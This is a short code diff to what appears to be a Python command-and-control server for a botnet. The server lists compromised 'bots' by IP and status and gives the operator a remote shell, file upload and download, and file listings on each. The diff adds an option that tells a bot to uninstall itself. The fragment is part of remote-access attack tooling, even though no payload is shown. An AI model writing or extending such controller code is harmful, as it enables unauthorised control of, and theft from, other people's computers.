@@ -48,7 +48,7 @@ def get_user(id):
         if user.id == id:
             return user
 #todo add option to uninstall from client
-#todo handle cmds like "python" in shell
+
 class User():
     def __init__(self, conn=None, name=None, ip=None):
         if conn:
@@ -188,7 +188,7 @@ def get_instructions():
             opt = get_choice([f'{user.name} | {user.ip} | {Fore.GREEN + "ALIVE" if user.alive else Fore.RED + "DEAD"}' for user in users] + ['Main Menu'], 'Select a bot:', subtitle='Name | IP | Status')
             if opt != len(curr_users):
                 user = get_user(curr_users[opt])
-                bot_opts = [Back.RED + 'Enter Shell' if not user.alive else 'Enter Shell', Back.RED + 'Upload File to Client' if not user.alive else 'Upload File to Client', Back.RED + 'Download File From Client' if not user.alive else 'Download File From Client', Back.RED + 'Get list of files on bot' if not user.alive else 'Get list of files on bot', Back.RED + 'View bot info' if not user.alive else 'View bot info', 'View bot session logs', 'Main Menu']
+                bot_opts = [Back.RED + 'Enter Shell' if not user.alive else 'Enter Shell', Back.RED + 'Upload File to Client' if not user.alive else 'Upload File to Client', Back.RED + 'Download File From Client' if not user.alive else 'Download File From Client', Back.RED + 'Get list of files on bot' if not user.alive else 'Get list of files on bot', Back.RED + 'View bot info' if not user.alive else 'View bot info', 'View bot session logs',  warning_text + 'Uninstall from bot', 'Main Menu']
                 opt = get_choice(bot_opts, 'Choose an action:', subtitle=f'For: {user.name} | {user.ip} | {Fore.GREEN + "ALIVE" if user.alive else Fore.RED + "DEAD"}')
                 if opt == 0:
                     if user.alive:
@@ -256,10 +256,23 @@ def get_instructions():
                 elif opt == 5:
                     for msg in user.hist:
                         print(Fore.MAGENTA + f'{msg["timestamp"]} | {msg["from"]}: {msg["msg"]}')
+                elif opt == 6:
+                    if user.alive:
+                        confirmation = input('Enter "confirm" to confirm removal: ')
+                        if confirmation == 'confirm':
+                            user.send({'type': 'remove'})
+                            response = user.get_response()
+                            print(standard_text + f'Client info received from {user.name}:')
+                            show(response['msg'])
+                        else:
+                            print('Operation cancelled')
+                    else:
+                        print(warning_text + 'Dead bot, chose a live one')
+
         else:
             print(warning_text + 'No bots found')
         get_instructions()
-
+#todo add opt to remove user from users.json
 def run():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind(addr)
